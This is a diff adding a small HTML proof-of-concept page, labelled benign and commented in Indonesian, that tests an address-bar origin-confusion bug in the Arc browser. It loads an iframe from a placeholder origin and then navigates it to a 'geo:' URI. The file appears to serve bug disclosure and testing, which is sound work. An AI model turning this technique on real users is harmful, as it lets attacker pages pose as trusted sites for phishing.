@@ -1,0 +1,21 @@
+<!DOCTYPE html><html><body>
+<h1>Arc origin-confusion PoC (benign)</h1>
+<p>Top-level origin: <b id="o"></b> — attacker-controlled content</p>
+<iframe id="f" style="width:300px;height:80px"></iframe>
+<pre id="log"></pre>
+<script>
+  var IFRAME_ORIGIN = "https://ORIGIN-KEDUA-ANDA/inner.html"; // origin yang mau diuji muncul di bar
+  var log=function(m){document.getElementById('log').textContent+=m+'\n';};
+  document.getElementById('o').textContent = location.origin;
+  var f = document.getElementById('f');
+  f.src = IFRAME_ORIGIN;
+  f.onload = function(){
+    log('iframe loaded: ' + IFRAME_ORIGIN);
+    setTimeout(function(){
+      // parent menavigasi subframe ke URI scheme (lintas-origin diizinkan)
+      f.src = "geo:0,0";
+      log('iframe -> geo: — PERHATIKAN ADDRESS BAR sekarang');
+    }, 800);
+  };
+</script>
+</body></html>
